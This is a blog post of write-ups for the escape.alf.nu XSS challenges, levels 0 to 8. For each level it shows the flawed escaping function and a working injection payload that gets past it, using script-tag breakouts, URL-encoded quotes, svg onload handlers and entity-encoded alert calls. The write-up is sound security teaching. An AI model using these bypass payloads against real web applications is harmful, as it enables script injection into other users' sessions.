+++
author = "pwntester"
categories = ["XSS", "JavaScript"]
date = 2014-01-06T21:58:00Z
description = ""
draft = false
slug = "escape-alf-nu-xss-challenges-write-ups-part-148"
tags = ["XSS", "JavaScript"]
title = "escape.alf.nu XSS Challenges Write-ups (Part 1)"

+++


These are my solutions to [Erling Ellingsen](https://twitter.com/steike) [escape.alf.nu XSS challenges](http://escape.alf.nu). I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.

My suggestion, if you havent done it so far, is to go and try to solve them by yourselves.... so come on, dont be lazy, stop reading here and give them a try ...

...

...

...

...

Ok so if you have already solve them or need some hits, here are my solutions

# Level 0:
```lang-javascript line-numbers 
function escape(s) {
  // Warmup.

  return '<script>console.log("'+s+'");</script>';
}
```

There is no encoding so the easiest solution is to close "log" call and inject our "alert"

Solution:
```lang-javascript line-numbers 
");alert(1,"
```

# Level 1:
```lang-javascript line-numbers 
function escape(s) {
  // Escaping scheme courtesy of Adobe Systems, Inc.
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

Function is escaping double quotes by adding two slashes. Shortest solution is to inject **\"** so the escape function turns it into

```lang-javascript line-numbers 
\\\"
```

Effectively escaping the backslash but not the double quotes.

Solution:
```lang-javascript line-numbers 
\");alert(1)//
```


# Level 2:
```lang-javascript line-numbers 
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

JSON.stringify() will escape double quotes (") into  (\") but it does not escaps angle brackets (<>), so we can close the current script block and start a brand new one.

Solution:
```lang-javascript line-numbers 
</script><script>alert(1)//
```

# Level 3:
```lang-javascript line-numbers 
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```

Again (") is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (")

Solution:
```lang-javascript line-numbers 
%22);alert(1)//
```


# Level 4:
```lang-javascript line-numbers 
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

The following characters are replaced:

* &lt; → &amp;lt; (all ocurrences)
* &quot; → &amp;quot; (just the first occurrence)

The escape function also use a template like [[src|alt]] that becomes

```lang-javascript line-numbers 
<img alt="alt" src="src.gif">
```

We can use this template with any **src** and an **alt** starting with a double quote (") that will be escaped, a second double quote (") that won't be escaped and then a new event handler like **onload="alert(1)** that will be closed by the double quote inserted by the template.

Solution:
```lang-javascript line-numbers 
[[a|""onload="alert(1)]]
```

It will be rendered as:

![](/images/octopress/xsslevel04.png)

# Level 5:
```lang-javascript line-numbers 
function escape(s) {
  // Level 4 had a typo, thanks Alok.
  // If your solution for 4 still works here, you can go back and get more points on level 4 now.

  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

Now we cannot rely on the (**"**) regexp typo but we can still use the template function to generate an image tag executing our **alert(1)** when loaded. We will use any **src** and a URL that will be replaced by the second replace function.

Solution:
```lang-javascript line-numbers 
[[a|http://onload='alert(1)']]
```

* The first replace function wont trigger with this payload
* The second replace function will act on the URL getting:
```lang-javascript line-numbers 
[[a|<a href="http://onload='alert(1)']]">http://onload='alert(1)']]</a>
```
* The third replace function will create our **img** tag
```lang-javascript line-numbers 
<img alt="<a href="http://onload='alert(1)']]">http://onload='alert(1)'" src="a.gif">
```

It will be rendered as:

![](/images/octopress/xsslevel05.png)

# Level 6:
```lang-javascript line-numbers 
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

The trick is to review all the functions in the DOM that begin with "create" and that dont escape characters. The shortest one is to use "createComment". For example **Comment#&lt;foo&gt;** will create the following code:

```lang-javascript line-numbers 
<!--<foo>-->
```

From there, its easy to go to:

```lang-javascript line-numbers 
Comment#><svg onload=alert(1)
```

That will render:

```lang-javascript line-numbers 
<!--><svg onload=alert(1)-->
```

# Level 7:
```lang-javascript line-numbers 
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:

Solution:
```lang-javascript line-numbers 
'#';alert(1)//
```

It will render:
```lang-javascript line-numbers 
<script>'({"userdata":"';alert(1)//"})</script>
```

# Level 8:
```lang-javascript line-numbers 
function escape(s) {
  // Courtesy of Skandiabanken
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

There is no escaping function, only an upper case, so we can close the exisiting **&lt;script&gt;** tag and create a new tag (case insensitive) with an **onload** script using no alpha characters:

These are some valid solutions:
```lang-javascript line-numbers 
</script><svg><script>&#x61&#x6C&#x65&#x72&#x74(1)//   (52)
</script><svg onload=&#x61&#x6C&#x65&#x72&#x74(1)//   (51)
</script><svg onload=&#97&#108&#101&#114&#116(1)//   (50)
```

I guess people solving the challange with 28 characters or so did something like:

```lang-javascript line-numbers 
</script><script src="<very short domain>">
```
